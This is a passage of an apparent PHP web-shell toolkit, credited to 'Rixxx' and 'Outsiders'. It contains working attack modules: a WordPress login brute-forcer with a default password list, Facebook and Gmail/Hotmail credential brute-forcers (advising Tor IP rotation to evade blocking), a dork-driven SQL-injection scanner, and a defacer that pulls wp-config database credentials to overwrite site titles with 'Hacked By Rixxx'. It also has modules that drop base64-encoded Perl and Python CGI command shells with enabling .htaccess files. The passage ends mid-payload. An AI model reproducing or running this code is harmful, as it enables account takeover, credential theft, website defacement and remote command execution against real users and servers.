      <td ><textarea style="background:black;" name="passwords" cols="30" rows="10"  ><?php if($_POST){echo $_POST['passwords'];}else {echo "admin\nadministrator\n123123\n123321\n123456\n1234567\n12345678\n123456789\n123456123456\nadmin2010\nadmin2011\npassword\nP@ssW0rd\n!@#$%^\n!@#$%^&*(\n(*&^%$#@!\n111111\n222222\n333333\n444444\n555555\n666666\n777777\n888888\n999999";} ?></textarea></td>
    </tr>
<tr><td colspan="4"><input class='inputzbut' type="submit" name="submit" value="Brute Now"  />
<?php
if($_POST)
{
	$hosts = trim(filter($_POST['hosts']));
	$passwords = trim(filter($_POST['passwords']));
	$usernames = trim(filter($_POST['usernames']));

	if($passwords && $usernames && $hosts)
	{
		$hosts_explode = explode("\n", $hosts);
		$usernames_explode = explode("\n", $usernames);
    	$passwords_explode = explode("\n", $passwords);

		foreach($hosts_explode as $host)
		{
			$host = RemoveLastSlash($host);
			$hacked = 0;
			$host = str_replace(array("http://","https://","www."),"",trim($host));
			$host = "http://".$host;
			$wpAdmin = $host.'/wp-admin/';

			if(!url_exists($host."/wp-login.php"))
			{echo "<p>".$host." => <font color='red'>Error In Login Page !</font></p>";ob_flush();flush();continue;}

			foreach($usernames_explode as $username)
			{
				foreach($passwords_explode as $password)
				{
					$ch   =     curl_init();
					curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
					curl_setopt($ch,CURLOPT_URL,$host.'/wp-login.php');
					curl_setopt($ch,CURLOPT_COOKIEJAR,"coki.txt");
					curl_setopt($ch,CURLOPT_COOKIEFILE,"coki.txt");
					curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);
					curl_setopt($ch,CURLOPT_POST,TRUE);
					curl_setopt($ch,CURLOPT_POSTFIELDS,"log=".$username."&pwd=".$password."&wp-submit=Giri&#8207;"."&redirect_to=".$wpAdmin."&testcookie=1");
					$login    =	   curl_exec($ch);

					if(eregi ("profile.php",$login) )
					{
						$hacked = 1;
						echo "<p>".$host." => UserName : [<font color='white'>".$username."</font>] : Password : [<font color='white'>".$password."</font>]</p>";
						ob_flush();flush();break;
					}
				}
				if($hacked == 1){break;}
			}
			if($hacked == 0)
			{echo "<p>".$host." => <font color='red'>Failed !</font></p>";ob_flush();flush();}
		}
	}
	else {echo "<p><font color='red'>All fields are Required ! </font></p>";}
}
?>
</td></tr>
</table></form></center>
<?php
function url_exists($strURL)
{
    $resURL = curl_init();
    curl_setopt($resURL, CURLOPT_URL, $strURL);
    curl_setopt($resURL, CURLOPT_BINARYTRANSFER, 1);
    curl_setopt($resURL, CURLOPT_HEADERFUNCTION, 'curlHeaderCallback');
    curl_setopt($resURL, CURLOPT_FAILONERROR, 1);
    curl_exec ($resURL);
    $intReturnCode = curl_getinfo($resURL, CURLINFO_HTTP_CODE);
    curl_close ($resURL);
    if ($intReturnCode != 200){return false;}
	else{return true ;}
}
function filter($string)
{
	if(get_magic_quotes_gpc() != 0){return stripslashes($string);	}
	else{return $string;	}
}
function RemoveLastSlash($host)
{
	if(strrpos($host, '/', -1) == strlen($host)-1)
	{return substr($host,0,strrpos($host, '/', -1));}
	else{return $host;}
}
echo "</p>";
}

elseif($_GET['do'] == 'fb'){

 @ini_set('output_buffering',0); 
?>
    <form action="?dir=<?php echo $pwd; ?>dox=fb" method="post">
	<br><br><center><b><font size=4>+--=[ Facebook BruteForce by Outsiders ]=--+</font></b></center><br><br>
	<?php
ob_start();
@set_time_limit(0);
#################################################
#---------------------------------------------- #
# Facebook Brute Force 2018                     #
# Recoded by : ./Outsiders                        #
# Greetz : All 1337Syndicate Members                #
# WWW.1337syndicate.site                       #
# --------------------------------------------- #
#################################################
 
echo "
<head>
<link rel='icon' type='image/ico' href='http://media.stateofq.com/photologue/photos/cache/facebook%20favicon_thumbnail.png'/>
<form method='POST'>
<title>Facebook Brute Force 2018</title>
</head>
<style>
textarea {
resize:none;
color: #1975FF ;
border:1px solid #1975FF ;
border-left: 4px solid #1975FF ;
}
input {
color: #1975FF;
border:1px dotted white;
}
</style>";
 
echo "
<body text='red'>
<center><img src='http://i.imgur.com/MiRrYCo.gif'></center>
<center>Gunakan ini dengan TOR BROWSER + TOR SWITCHER (ganti IP setiap 2 Menit Supaya Gak DIblok FB cok :v)</center>
<p dir='ltr' align='center'>
<textarea name='username' cols='42' rows='14'>Username Target Lu Cok</textarea>
<textarea name='password' cols='42' rows='14'>Wordlist Password Target Lu Cok</textarea><br>
<br>
<input type='submit' name='scan' value='Start BruteForce'><br></p>";
if(isset($_POST['scan'])){
#To Put Proxy SOCKS V5
//curl_setopt($ch, CURLOPT_PROXY, "proxy:port");          
//curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
function brute($user,$pass){
$ch = curl_init();      
curl_setopt($ch, CURLOPT_URL, "https://m.facebook.com/login.php?login_attempt=1");
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
curl_setopt($ch, CURLOPT_POSTFIELDS, "email={$user}&pass={$pass}");
curl_setopt($ch, CURLOPT_USERAGENT, "Chrome/36.0.1985.125");
$login = curl_exec($ch);
//print_r($login);
$check = (eregi('class="s t i u"',$login)) ? true:false;
if($check == true){
echo "<p align='center' dir='ltr'><font face='Arial Black' size='2'>Not the right one :(  || Username : <font color='red'>$user</font>&nbsp;  Password : <font color='red'>$pass</font></font></p>";
}else{
echo "<p align='center' dir='ltr'><font face='Arial Black' size='2'>This Password Seems Working !Try It ^_^ by Rixxx|| Username: <font color='green'>$user</font>&nbsp; Password : <font color='green'>$pass</font></font></p>";
}
}            
 
 
 
$username = explode("\n", $_POST['username']);
$password = explode("\n", $_POST['password']);
foreach($username as $users) {
$users = @trim($users);
foreach($password as $pass) {
$pass = @trim($pass);
echo brute($users,$pass);
}
 
}
 
}
echo"<br>
<br>
<br>
<br>
<center><p><b><font size='2' face='Trebuchet MS' color='#FFFFFF'>Published by : Rixxx<br><font size='2' face='Trebuchet MS' color='#FFFFFF'>Coded by : Rixxx</font></b></p></center>";
}

elseif($_GET['do'] == 'emailbrute'){ 
	@ini_set('output_buffering',0); 
?>
    <form action="?y=<?php echo $pwd; ?>&x=syahrul" method="post">
	<br><br><center><b><font size=4>+--=[ Gmail BruteForce by Outsiders ]=--+</font></b></center><br>
	<center><span style="font-size:30px; font-family:Fredericka the Great; color:#1975FF">Gmail & Hotmail BruteForce Outsiders</span><center><br>
	<?php
   set_time_limit(0); 
error_reporting(0); 
         
class s1{ 
         
private $adres = array( 
'gmail' => '{imap.gmail.com:993/imap/ssl}', 
'hotmail' => '{pop3.live.com:995/pop3/ssl}' 
); 
private $imap;         
function __construct($gelen1,$gelen2){ 
                 
$uname     = explode("\r\n",$gelen1);     
$pwd     = explode("\r\n",$gelen2);     
foreach($pwd as $pass){ 
$pass = trim($pass); 
foreach($uname as $user){ 
$user = trim($user); 
                                 
if(preg_match('@gmail@si',$user)){ 
$this->baglan($this->adres["gmail"],$user,$pass); 
}else{ 
$this->baglan($this->adres["hotmail"],$user,$pass); 
} 
} 
} 
}     
                 
public function baglan($url,$user,$pass){ 
                 
$this->imap = imap_open($url,$user,$pass); 
if($this->imap){ 
echo "<span id='cikti' >$user => $pass </span><br 

/>"; 
} 
} 
function __destruct(){ 
             
imap_close($this->imap); 
             
} 
} 
         
echo "
<head>
<link rel='icon' type='image/ico' href='http://www.hondupalmahn.com/imagenes/gmail.png'/>
<form method='POST'>
<title>Gmail Brute Force 2018</title>
</head>
<style>
textarea {
resize:none;
color: #1975FF ;
border:1px solid #1975FF ;
border-left: 4px solid #1975FF ;
}
input {
color: #1975FF;
border:1px dotted #33CCFF;
}
</style>";

		 echo '<br /> <center><div id="form"> 
<form id="form" method="POST" > 
<textarea cols="42" class="area" name="mail" rows="14" 

cols="28">Email Target Lu Disini Cok ^_^</textarea>  
<textarea cols="42" class="area" name="sifre" rows="14" 

cols="28">Password List Lu Disini Cok ^_^</textarea> <br /> <br />
<input type="submit" id="submit" value="Brute !" /> 
</form><br> 
</div> 
<div id="sonuc"> ';
        
         
if($_POST){ 
$mails = $_POST["mail"]; 
$sifre = $_POST["sifre"]; 
             
if((isset($mails)) and (isset($sifre))){     
$s1 = new s1($mails,$sifre); 
} 
} 
         
echo '</center></div> ';
}

elseif($_GET['do'] == 'sqli-scanner')
{	
?>
<form action="?dir=<?php echo $pwd; ?>&amp;=sqli-scanner" method="post">

<?php

echo '<br><br><center><form method="post" action=""><b><font color="white">Dork : </font></b> &nbsp;&nbsp;<input class="inputz" type="text" value="" name="dork" style="color:white;background-color:#000000" size="20"/>&nbsp;<input class="inputzbut" type="submit" style="color:white;background-color:#000000" name="scan" value="Scan"></form></center>';

ob_start();
set_time_limit(0);

if (isset($_POST['scan'])) {

$browser = $_SERVER['HTTP_USER_AGENT'];

$first = "startgoogle.startpagina.nl/index.php?q=";
$sec = "&start=";
$reg = '/<p class="g"><a href="(.*)" target="_self" onclick="/';

for($id=0 ; $id<=30; $id++){
$page=$id*10;
$dork=urlencode($_POST['dork']);
$url = $first.$dork.$sec.$page;

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl,CURLOPT_USERAGENT,'$browser)');
$result = curl_exec($curl);
curl_close($curl);

preg_match_all($reg,$result,$matches);
}
foreach($matches[1] as $site){

$url = preg_replace("/=/", "='", $site);
$curl=curl_init();
curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);
curl_setopt($curl,CURLOPT_URL,$url);
curl_setopt($curl,CURLOPT_USERAGENT,'$browser)');
curl_setopt($curl,CURLOPT_TIMEOUT,'5');
$GET=curl_exec($curl); 
if (preg_match("/error in your SQL syntax|mysql_fetch_array()|execute query|mysql_fetch_object()|mysql_num_rows()|mysql_fetch_assoc()|mysql_fetch&#8203;_row()|SELECT * 

FROM|supplied argument is not a valid MySQL|Syntax error|Fatal error/i",$GET)) { 
echo '<center><b><font color="#E10000">Found : </font><a href="'.$url.'" target="_blank">'.$url.'</a><font color=#FF0000> &#60;-- SQLI Vuln 

Found..</font></b></center>';
ob_flush();flush(); 
}else{ 
echo '<center><font color="#FFFFFF"><b>'.$url.'</b></font><font color="#0FFF16"> &#60;-- Not Vuln</font></center>';
ob_flush();flush(); 
}
ob_flush();flush();
}
ob_flush();flush();
}
ob_flush();flush();
}

elseif($_GET['do'] == 'phpinfo'){ 
	@ob_start();
	@eval("phpinfo();");
	$buff = @ob_get_contents();
	@ob_end_clean();	
	$awal = strpos($buff,"<body>")+6;
	$akhir = strpos($buff,"</body>");
	echo "<div class=\"phpinfo\">".substr($buff,$awal,$akhir-$awal)."</div>";
}

elseif($_GET['do'] == 'title'){
echo "<center><h1>Mass Title Changer</h1>
<form method='post'>
Link Config: <br>
<input type='text' name='linkconf' height='10' style='width: 450px;' placeholder='http://xnxx.com/ia_symconf/'><br>
<input type='submit' style='width: 450px;' name='gass' value='Hajar!!' class='oke'>
</form></center>";
if($_POST['gass']) {
    echo "<center>
<form method='post'>
Link Config: <br>
<textarea name='link'>";
GrabUrl($_POST['linkconf'],'wordpress');   
echo"</textarea><br>ID: <input type='text' name='id' value='1'><br>TITLE :<input type='text' name='title' value='Hacked By Rixxx'><br>POST CONTENT: <input type='text' name='content' value='Hacked By Rixxx'><br>POSTNAME: <input type='text' name='postname' value='HackeD By Rixxx'><br>
<input type='submit' style='width: 450px;' name='edittitle' value='Gassbre!!'>
</form></center>";
}
if($_POST['edittitle']) {
            $title = htmlspecialchars($_POST['title']);
                $id = $_POST['id'];
                $content = $_POST['content'];
                $postname = $_POST['name'];
        function anucurl($sites) {
            $ch = curl_init($sites);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
                  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIESESSION,true);
            $data = curl_exec($ch);
                  curl_close($ch);
            return $data;
        }
        $link = explode("\r\n", $_POST['link']);
        foreach($link as $dir_config) {
                                $config = anucurl($dir_config);
                $dbhost = ambilkata($config,"DB_HOST', '","'");
                $dbuser = ambilkata($config,"DB_USER', '","'");
                $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
                $dbname = ambilkata($config,"DB_NAME', '","'");
                $dbprefix = ambilkata($config,"table_prefix  = '","'");
                $prefix = $dbprefix."posts";
                $option = $dbprefix."options";
                $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                $db = mysql_select_db($dbname);
                $q = mysql_query("SELECT * FROM $prefix ORDER BY ID ASC");
                $result = mysql_fetch_array($q);
                $id = $result[ID];
                $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
                $result2 = mysql_fetch_array($q2);
                $target = $result2[option_value];
                $update = mysql_query("UPDATE $prefix SET post_title='$title',post_content='$content',post_name='$postname',post_status='publish',comment_status='open',ping_status='open',post_type='post',comment_count='1' WHERE id='$id'");
                $update .= mysql_query("UPDATE $option SET option_value='$title' WHERE option_name='blogname' OR option_name='blogdescription'");
                echo "<div style='margin: 5px auto;'>";
                if($target == '') {
                    echo "URL: <font color=red>error, gabisa ambil nama domain nya</font> -> ";
                } else {
                    echo "URL: <a href='$target/?p=$id' target='_blank'>$target/?p=$id</a> -> ";
                }
                if(!$update OR !$conn OR !$db) {
                    echo "<font color=red>MySQL Error: ".mysql_error()."</font><br>";
                } else {
                    echo "<font color=lime>sukses di ganti.</font><br>";
                }
                echo "</div>";
                mysql_close($conn);
            }
        }
}
	

	elseif($_GET['do'] == 'cgipy') {
	$cgi_dir = mkdir('ia_cgi', 0755);
        chdir('ia_cgi');
	$file_cgi = "cgipy.Rixxx";
        $memeg = ".htaccess";
	$isi_htcgi = "OPTIONS Indexes Includes ExecCGI FollowSymLinks \n AddType application/x-httpd-cgi .Index_Rixxx \n AddHandler cgi-script .Index_Rixxx \n AddHandler cgi-script .Index_Rixxx";
	$htcgi = fopen(".htaccess", "w");
	$cgi_script = "IyEvdXNyL2Jpbi9weXRob24NCiMgMDctMDctMDQNCiMgdjEuMC4wDQoNCiMgY2dpLXNoZWxsLnB5DQojIEEgc2ltcGxlIENHSSB0aGF0IGV4ZWN1dGVzIGFyYml0cmFyeSBzaGVsbCBjb21tYW5kcy4NCg0KDQojIENvcHlyaWdodCBNaWNoYWVsIEZvb3JkDQojIFlvdSBhcmUgZnJlZSB0byBtb2RpZnksIHVzZSBhbmQgcmVsaWNlbnNlIHRoaXMgY29kZS4NCg0KIyBObyB3YXJyYW50eSBleHByZXNzIG9yIGltcGxpZWQgZm9yIHRoZSBhY2N1cmFjeSwgZml0bmVzcyB0byBwdXJwb3NlIG9yIG90aGVyd2lzZSBmb3IgdGhpcyBjb2RlLi4uLg0KIyBVc2UgYXQgeW91ciBvd24gcmlzayAhISENCg0KIyBFLW1haWwgbWljaGFlbCBBVCBmb29yZCBET1QgbWUgRE9UIHVrDQojIE1haW50YWluZWQgYXQgd3d3LnZvaWRzcGFjZS5vcmcudWsvYXRsYW50aWJvdHMvcHl0aG9udXRpbHMuaHRtbA0KDQoiIiINCkEgc2ltcGxlIENHSSBzY3JpcHQgdG8gZXhlY3V0ZSBzaGVsbCBjb21tYW5kcyB2aWEgQ0dJLg0KIiIiDQojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjDQojIEltcG9ydHMNCnRyeToNCiAgICBpbXBvcnQgY2dpdGI7IGNnaXRiLmVuYWJsZSgpDQpleGNlcHQ6DQogICAgcGFzcw0KaW1wb3J0IHN5cywgY2dpLCBvcw0Kc3lzLnN0ZGVyciA9IHN5cy5zdGRvdXQNCmZyb20gdGltZSBpbXBvcnQgc3RyZnRpbWUNCmltcG9ydCB0cmFjZWJhY2sNCmZyb20gU3RyaW5nSU8gaW1wb3J0IFN0cmluZ0lPDQpmcm9tIHRyYWNlYmFjayBpbXBvcnQgcHJpbnRfZXhjDQoNCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMNCiMgY29uc3RhbnRzDQoNCmZvbnRsaW5lID0gJzxGT05UIENPTE9SPSM0MjQyNDIgc3R5bGU9ImZvbnQtZmFtaWx5OnRpbWVzO2ZvbnQtc2l6ZToxMnB0OyI+Jw0KdmVyc2lvbnN0cmluZyA9ICdWZXJzaW9uIDEuMC4wIDd0aCBKdWx5IDIwMDQnDQoNCmlmIG9zLmVudmlyb24uaGFzX2tleSgiU0NSSVBUX05BTUUiKToNCiAgICBzY3JpcHRuYW1lID0gb3MuZW52aXJvblsiU0NSSVBUX05BTUUiXQ0KZWxzZToNCiAgICBzY3JpcHRuYW1lID0gIiINCg0KTUVUSE9EID0gJyJQT1NUIicNCg0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIw0KIyBQcml2YXRlIGZ1bmN0aW9ucyBhbmQgdmFyaWFibGVzDQoNCmRlZiBnZXRmb3JtKHZhbHVlbGlzdCwgdGhlZm9ybSwgbm90cHJlc2VudD0nJyk6DQogICAgIiIiVGhpcyBmdW5jdGlvbiwgZ2l2ZW4gYSBDR0kgZm9ybSwgZXh0cmFjdHMgdGhlIGRhdGEgZnJvbSBpdCwgYmFzZWQgb24NCiAgICB2YWx1ZWxpc3QgcGFzc2VkIGluLiBBbnkgbm9uLXByZXNlbnQgdmFsdWVzIGFyZSBzZXQgdG8gJycgLSBhbHRob3VnaCB0aGlzIGNhbiBiZSBjaGFuZ2VkLg0KICAgIChlLmcuIHRvIHJldHVybiBOb25lIHNvIHlvdSBjYW4gdGVzdCBmb3IgbWlzc2luZyBrZXl3b3JkcyAtIHdoZXJlICcnIGlzIGEgdmFsaWQgYW5zd2VyIGJ1dCB0byBoYXZlIHRoZSBmaWVsZCBtaXNzaW5nIGlzbid0LikiIiINCiAgICBkYXRhID0ge30NCiAgICBmb3IgZmllbGQgaW4gdmFsdWVsaXN0Og0KICAgICAgICBpZiBub3QgdGhlZm9ybS5oYXNfa2V5KGZpZWxkKToNCiAgICAgICAgICAgIGRhdGFbZmllbGRdID0gbm90cHJlc2VudA0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgaWYgIHR5cGUodGhlZm9ybVtmaWVsZF0pICE9IHR5cGUoW10pOg0KICAgICAgICAgICAgICAgIGRhdGFbZmllbGRdID0gdGhlZm9ybVtmaWVsZF0udmFsdWUNCiAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgdmFsdWVzID0gbWFwKGxhbWJkYSB4OiB4LnZhbHVlLCB0aGVmb3JtW2ZpZWxkXSkgICAgICMgYWxsb3dzIGZvciBsaXN0IHR5cGUgdmFsdWVzDQogICAgICAgICAgICAgICAgZGF0YVtmaWVsZF0gPSB2YWx1ZXMNCiAgICByZXR1cm4gZGF0YQ0KDQoNCnRoZWZvcm1oZWFkID0gIiIiPEhUTUw+PEhFQUQ+PFRJVExFPmNnaS1zaGVsbC5weSAtIGEgQ0dJIGJ5IEZ1enp5bWFuPC9USVRMRT48L0hFQUQ+DQo8Qk9EWT48Q0VOVEVSPg0KPEgxPldlbGNvbWUgdG8gY2dpLXNoZWxsLnB5IC0gPEJSPmEgUHl0aG9uIENHSTwvSDE+DQo8Qj48ST5CeSBGdXp6eW1hbjwvQj48L0k+PEJSPg0KIiIiK2ZvbnRsaW5lICsiVmVyc2lvbiA6ICIgKyB2ZXJzaW9uc3RyaW5nICsgIiIiLCBSdW5uaW5nIG9uIDogIiIiICsgc3RyZnRpbWUoJyVJOiVNICVwLCAlQSAlZCAlQiwgJVknKSsnLjwvQ0VOVEVSPjxCUj4nDQoNCnRoZWZvcm0gPSAiIiI8SDI+RW50ZXIgQ29tbWFuZDwvSDI+DQo8Rk9STSBNRVRIT0Q9XCIiIiIgKyBNRVRIT0QgKyAnIiBhY3Rpb249IicgKyBzY3JpcHRuYW1lICsgIiIiXCI+DQo8aW5wdXQgbmFtZT1jbWQgdHlwZT10ZXh0PjxCUj4NCjxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0iU3VibWl0Ij48QlI+DQo8L0ZPUk0+PEJSPjxCUj4iIiINCmJvZHllbmQgPSAnPC9CT0RZPjwvSFRNTD4nDQplcnJvcm1lc3MgPSAnPENFTlRFUj48SDI+U29tZXRoaW5nIFdlbnQgV3Jvbmc8L0gyPjxCUj48UFJFPicNCg0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIw0KIyBtYWluIGJvZHkgb2YgdGhlIHNjcmlwdA0KDQppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOg0KICAgIHByaW50ICJDb250ZW50LXR5cGU6IHRleHQvaHRtbCIgICAgICAgICAjIHRoaXMgaXMgdGhlIGhlYWRlciB0byB0aGUgc2VydmVyDQogICAgcHJpbnQgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgc28gaXMgdGhpcyBibGFuayBsaW5lDQogICAgZm9ybSA9IGNnaS5GaWVsZFN0b3JhZ2UoKQ0KICAgIGRhdGEgPSBnZXRmb3JtKFsnY21kJ10sZm9ybSkNCiAgICB0aGVjbWQgPSBkYXRhWydjbWQnXQ0KICAgIHByaW50IHRoZWZvcm1oZWFkDQogICAgcHJpbnQgdGhlZm9ybQ0KICAgIGlmIHRoZWNtZDoNCiAgICAgICAgcHJpbnQgJzxIUj48QlI+PEJSPicNCiAgICAgICAgcHJpbnQgJzxCPkNvbW1hbmQgOiAnLCB0aGVjbWQsICc8QlI+PEJSPicNCiAgICAgICAgcHJpbnQgJ1Jlc3VsdCA6IDxCUj48QlI+Jw0KICAgICAgICB0cnk6DQogICAgICAgICAgICBjaGlsZF9zdGRpbiwgY2hpbGRfc3Rkb3V0ID0gb3MucG9wZW4yKHRoZWNtZCkNCiAgICAgICAgICAgIGNoaWxkX3N0ZGluLmNsb3NlKCkNCiAgICAgICAgICAgIHJlc3VsdCA9IGNoaWxkX3N0ZG91dC5yZWFkKCkNCiAgICAgICAgICAgIGNoaWxkX3N0ZG91dC5jbG9zZSgpDQogICAgICAgICAgICBwcmludCByZXN1bHQucmVwbGFjZSgnXG4nLCAnPEJSPicpDQoNCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiwgZTogICAgICAgICAgICAgICAgICAgICAgIyBhbiBlcnJvciBpbiBleGVjdXRpbmcgdGhlIGNvbW1hbmQNCiAgICAgICAgICAgIHByaW50IGVycm9ybWVzcw0KICAgICAgICAgICAgZiA9IFN0cmluZ0lPKCkNCiAgICAgICAgICAgIHByaW50X2V4YyhmaWxlPWYpDQogICAgICAgICAgICBhID0gZi5nZXR2YWx1ZSgpLnNwbGl0bGluZXMoKQ0KICAgICAgICAgICAgZm9yIGxpbmUgaW4gYToNCiAgICAgICAgICAgICAgICBwcmludCBsaW5lDQoNCiAgICBwcmludCBib2R5ZW5kDQoNCg0KIiIiDQpUT0RPL0lTU1VFUw0KDQoNCg0KQ0hBTkdFTE9HDQoNCjA3LTA3LTA0ICAgICAgICBWZXJzaW9uIDEuMC4wDQpBIHZlcnkgYmFzaWMgc3lzdGVtIGZvciBleGVjdXRpbmcgc2hlbGwgY29tbWFuZHMuDQpJIG1heSBleHBhbmQgaXQgaW50byBhIHByb3BlciAnZW52aXJvbm1lbnQnIHdpdGggc2Vzc2lvbiBwZXJzaXN0ZW5jZS4uLg0KIiIi";
	$cgi = fopen($file_cgi, "w");
	fwrite($cgi, base64_decode($cgi_script));
	fwrite($htcgi, $isi_htcgi);
	chmod($file_cgi, 0755);
        chmod($memeg, 0755);
	echo "<br><center>Done ... <a href='ia_cgi/cgipy.Rixxx' target='_blank'>Klik Here</a>";
}
	

elseif($_GET['do'] == 'cgi') {
	$cgi_dir = mkdir('ia_cgi', 0755);
        chdir('ia_cgi');
	$file_cgi = "cgi.Rixxx";
        $memeg = ".htaccess";
	$isi_htcgi = "OPTIONS Indexes Includes ExecCGI FollowSymLinks \n AddType application/x-httpd-cgi .Rixxx \n AddHandler cgi-script .Rixxx \n AddHandler cgi-script .Rixxx";
	$htcgi = fopen(".htaccess", "w");
	$cgi_script = "IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQp1c2UgTUlNRTo6QmFzZTY0Ow0KJFZlcnNpb249ICJDR0ktVGVsbmV0IFZlcnNpb24gMS4zIjsNCiRFZGl0UGVyc2lvbj0iPGZvbnQgc3R5bGU9J3RleHQtc2hhZG93OiAwcHggMHB4IDZweCByZ2IoMjU1LCAwLCAwKSwgMHB4IDBweCA1cHggcmdiKDMwMCwgMCwgMCksIDBweCAwcHggNXB4IHJnYigzMDAsIDAsIDApOyBjb2xvcjojZmZmZmZmOyBmb250LXdlaWdodDpib2xkOyc+YjM3NGsgLSBDR0ktVGVsbmV0PC9mb250PiI7DQoNCiRQYXNzd29yZCA9ICJ4YWlzeW5kaWNhdGUiOwkJCSMgQ2hhbmdlIHRoaXMuIFlvdSB3aWxsIG5lZWQgdG8gZW50ZXIgdGhpcyB0byBsb2dpbi4NCnN1YiBJc19XaW4oKXsNCgkkb3MgPSAmdHJpbSgkRU5WeyJTRVJWRVJfU09GVFdBUkUifSk7DQoJaWYoJG9zID1+IG0vd2luL2kpew0KCQlyZXR1cm4gMTsNCgl9DQoJZWxzZXsNCgkJcmV0dXJuIDA7DQoJfQ0KfQ0KJFdpbk5UID0gJklzX1dpbigpOwkJCQkjIFlvdSBuZWVkIHRvIGNoYW5nZSB0aGUgdmFsdWUgb2YgdGhpcyB0byAxIGlmDQoJCQkJCQkJCSMgeW91J3JlIHJ1bm5pbmcgdGhpcyBzY3JpcHQgb24gYSBXaW5kb3dzIE5UDQoJCQkJCQkJCSMgbWFjaGluZS4gSWYgeW91J3JlIHJ1bm5pbmcgaXQgb24gVW5peCwgeW91DQoJCQkJCQkJCSMgY2FuIGxlYXZlIHRoZSB2YWx1ZSBhcyBpdCBpcy4NCg0KJE5UQ21kU2VwID0gIiYiOwkJCQkjIFRoaXMgY2hhcmFjdGVyIGlzIHVzZWQgdG8gc2VwZXJhdGUgMiBjb21tYW5kcw0KCQkJCQkJCQkjIGluIGEgY29tbWFuZCBsaW5lIG9uIFdpbmRvd3MgTlQuDQoNCiRVbml4Q21kU2VwID0gIjsiOwkJCQkjIFRoaXMgY2hhcmFjdGVyIGlzIHVzZWQgdG8gc2VwZXJhdGUgMiBjb21tYW5kcw0KCQkJCQkJCQkjIGluIGEgY29tbWFuZCBsaW5lIG9uIFVuaXguDQoNCiRDb21tYW5kVGltZW91dER1cmF0aW9uID0gMTAwMDA7CSMgVGltZSBpbiBzZWNvbmRzIGFmdGVyIGNvbW1hbmRzIHdpbGwgYmUga2lsbGVkDQoJCQkJCQkJCSMgRG9uJ3Qgc2V0IHRoaXMgdG8gYSB2ZXJ5IGxhcmdlIHZhbHVlLiBUaGlzIGlzDQoJCQkJCQkJCSMgdXNlZnVsIGZvciBjb21tYW5kcyB0aGF0IG1heSBoYW5nIG9yIHRoYXQNCgkJCQkJCQkJIyB0YWtlIHZlcnkgbG9uZyB0byBleGVjdXRlLCBsaWtlICJmaW5kIC8iLg0KCQkJCQkJCQkjIFRoaXMgaXMgdmFsaWQgb25seSBvbiBVbml4IHNlcnZlcnMuIEl0IGlzDQoJCQkJCQkJCSMgaWdub3JlZCBvbiBOVCBTZXJ2ZXJzLg0KDQokU2hvd0R5bmFtaWNPdXRwdXQgPSAxOwkJCSMgSWYgdGhpcyBpcyAxLCB0aGVuIGRhdGEgaXMgc2VudCB0byB0aGUNCgkJCQkJCQkJIyBicm93c2VyIGFzIHNvb24gYXMgaXQgaXMgb3V0cHV0LCBvdGhlcndpc2UNCgkJCQkJCQkJIyBpdCBpcyBidWZmZXJlZCBhbmQgc2VuZCB3aGVuIHRoZSBjb21tYW5kDQoJCQkJCQkJCSMgY29tcGxldGVzLiBUaGlzIGlzIHVzZWZ1bCBmb3IgY29tbWFuZHMgbGlrZQ0KCQkJCQkJCQkjIHBpbmcsIHNvIHRoYXQgeW91IGNhbiBzZWUgdGhlIG91dHB1dCBhcyBpdA0KCQkJCQkJCQkjIGlzIGJlaW5nIGdlbmVyYXRlZC4NCg0KIyBET04nVCBDSEFOR0UgQU5ZVEhJTkcgQkVMT1cgVEhJUyBMSU5FIFVOTEVTUyBZT1UgS05PVyBXSEFUIFlPVSdSRSBET0lORyAhIQ0KDQokQ21kU2VwID0gKCRXaW5OVCA/ICROVENtZFNlcCA6ICRVbml4Q21kU2VwKTsNCiRDbWRQd2QgPSAoJFdpbk5UID8gImNkIiA6ICJwd2QiKTsNCiRQYXRoU2VwID0gKCRXaW5OVCA/ICJcXCIgOiAiLyIpOw0KJFJlZGlyZWN0b3IgPSAoJFdpbk5UID8gIiAyPiYxIDE+JjIiIDogIiAxPiYxIDI+JjEiKTsNCiRjb2xzPSAxNTA7DQokcm93cz0gMjY7D